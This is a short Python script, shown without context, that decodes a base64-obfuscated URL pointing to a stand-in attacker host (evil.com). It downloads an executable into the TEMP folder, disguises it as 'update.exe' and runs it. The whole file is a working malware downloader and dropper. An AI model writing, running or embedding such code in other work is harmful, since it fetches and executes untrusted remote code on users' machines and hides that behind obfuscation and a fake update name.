
import urllib.request, subprocess, os, base64

url = base64.b64decode("aHR0cDovL2V2aWwuY29tL3BheWxvYWQuZXhl").decode()
path = os.path.join(os.environ["TEMP"], "update.exe")
urllib.request.urlretrieve(url, path)
subprocess.Popen(path)
